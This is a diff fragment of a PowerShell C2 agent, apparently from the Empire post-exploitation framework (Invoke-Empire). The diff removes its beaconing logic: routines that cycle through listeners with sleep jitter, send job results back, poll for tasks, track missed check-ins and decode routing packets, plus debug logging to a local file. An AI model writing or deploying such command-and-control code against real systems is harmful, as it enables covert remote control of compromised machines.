@@ -769,46 +769,14 @@ function Invoke-Empire {
 		$script:listeners = $newlisteners
 	}
 
-	$script:BeaconBack = {
-		param($JobResults)
-		foreach ($l in $script:listeners){
 			SleepWithJitter($l)	
 			if ($JobResults) {
-                "got job results"|Out-File "out.log" -Append -NoClobber
-                $JobResults|Out-File "out.log" -Append -NoClobber
-				((& $SendMessage -Listener $l -Packets $JobResults))
 			}
-			if ((& $script:GetTask -Listener $l)){
-                break
-            }
 		}
-		((& $script:CleanUpListeners))
-	}
-	# send message function iterating through listeners
-	$script:SendMessage = {
-		param($Listener, $Packets)
-        "called send message" | Out-File "out.log" -Append -NoClobber
-        $Listener["name"]|Out-File "out.log" -Append -NoClobber
-        ((& $Listener["send_func"] -Packets $Packets -FixedParameters $Listener["fixed_parameters"]))
 	}
 
 	$script:GetTask = {
-		param($Listener)
-        "calling getTask with listener" | Out-File "out.log" -Append -NoClobber
-        $Listener["name"]|Out-File "out.log" -Append -NoClobber
-
-		$TaskData = (& $Listener['get_task_func'] -FixedParameters $Listener["fixed_parameters"])
-		if (!$TaskData){
-            "no task data, increasing missedcheckins"|Out-File "out.log" -Append -NoClobber
-			$Listener['missedCheckins'] += 1
-            $False
-		}
-		else {
-			if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $Listener['defaultResponse']) {
-                "got something not equal to defaultResponse, calling decoderoutingpacket"|Out-File "out.log" -Append -NoClobber
-				Decode-RoutingPacket -PacketData $TaskData
 			}
-            $True
 		}
 	}
 
